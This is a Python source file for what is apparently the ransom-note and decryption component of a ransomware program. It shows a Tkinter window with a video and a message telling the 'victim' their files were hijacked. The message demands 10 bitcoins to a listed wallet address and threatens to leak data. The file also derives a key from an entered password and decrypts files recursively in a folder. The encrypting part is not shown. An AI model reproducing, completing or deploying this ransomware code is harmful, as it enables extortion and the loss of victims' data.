import tkinter as tk
import cv2
from PIL import Image, ImageTk
import pathlib
import secrets
import os
import base64
import getpass

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


import pathlib
from cryptography.fernet import Fernet
import base64
import hashlib




width=0
#Function to center of the screen
def center_window(window, width_percent, height_percent):
    global width
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()

    width = int(screen_width * width_percent / 100)
    height = int(screen_height * height_percent / 100)
    print(f'width {width}')
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2

    window.geometry(f"{width}x{height}+{x}+{y}")

#Resize video to fit smaller screens
def resize_frame(frame, target_width, target_height):
    height, width, _ = frame.shape
    aspect_ratio = width / height

    if aspect_ratio > 1:
        new_width = target_width
        new_height = int(target_width / aspect_ratio)
    else:
        new_height = target_height
        new_width = int(target_height * aspect_ratio)

    return cv2.resize(frame, (new_width, new_height))

#show video
def show_video(canvas, cap, target_width, target_height):
    ret, frame = cap.read()
    if ret:
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame = resize_frame(frame, target_width, target_height)
        img = Image.fromarray(frame)
        img = ImageTk.PhotoImage(img)
        canvas.config(width=target_width, height=target_height)
        canvas.create_image(0, 0, anchor=tk.NW, image=img)
        canvas.img = img
        canvas.after(10, show_video, canvas, cap, target_width, target_height)

#Create tk inter window
def create_window():
    global width, entry_box
    root = tk.Tk()
    root.title("Video Player")

    width_percent = 50
    height_percent = 70
    center_window(root, width_percent, height_percent)

    #target_width = 200
    target_height = int(width/2)-50

    canvas = tk.Canvas(root, width=target_height, height=target_height)
    canvas.place(relx=0.6, rely=0.55, anchor=tk.CENTER)  # Center the canvas

    cap = cv2.VideoCapture("squirtle_sax.mp4")  # Replace "your_video.mp4" with the path to your video file

    show_video(canvas, cap, target_height, target_height)
    

    text_lines = [        
        "Dear victim, you have been hacked. Your files have been hijacked and retrieved. ",
        "Send 10 bitcoins here: bc1q6l08rtj6j907r2een0jqs6l7qnruwyxfshmf8a",
        "Your files have been hijacked and retrieved. If you don't pay, sensible",
        "information will be leaked and files lost."
    ]
    text_size=int((width%100)/10)+10
    if (width%100)==0:
        text_size=int((width%101)/10)+10
    print(f'text size {text_size}')
    if text_size<3:
        text_size=3

    for i, line in enumerate(text_lines):
        label = tk.Label(root, text=line, font=("Helvetica", text_size), anchor=tk.W)
        #label.place(relx=0.0, rely=0.05 + i * 0.05, anchor=tk.W)
        label.pack(fill=tk.X, padx=5, pady=5)

    entry_box = tk.Entry(root, width=30)  # Adjust the width here
    entry_box.insert(0, "Enter password")
    entry_box.place(relx=0.4, rely=0.9, anchor=tk.CENTER, height=40)
    # Bind the click event to the entry box
    entry_box.bind("<Button-1>", clear_default_text)

    

    button = tk.Button(root, text="Submit", command=but_decrypt, width=20, height=2)  # Adjust the width here
    button.place(relx=0.6, rely=0.9, anchor=tk.CENTER)
    

    root.mainloop()
    
def clear_default_text(event):
    # Clear the default text when the entry box is clicked
    entry_box.delete(0, tk.END)
   
#Decryption functions 
def but_decrypt():
    global entry_box
    foldername = 'test'
    password = entry_box.get()
    print(f'valor password -{password}-')
    key = generate_key(password)
    for i in range(10):
        decrypt_folder(foldername, key)
    entry_box.delete(0, tk.END)
    
    
def generate_key(password):
        hash_obj = hashlib.sha256(str(password).encode())
        hash_key = hash_obj.digest()
        return base64.urlsafe_b64encode(hash_key[:32])

def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and writes it"""
    f = Fernet(key)
    file_name_string=str(filename)
    if 'Program Files' in file_name_string:
        return
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # decrypt data
    print(f'filename-->{filename}')
    try:
        decrypted_data = f.decrypt(file_data)
    except:
        return
    # write the decrypted file
     
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_folder(foldername, key):
    # if it's a folder, decrypt the entire folder (i.e., all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(str(child), key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(str(child), key)
    


# Run the program
create_window()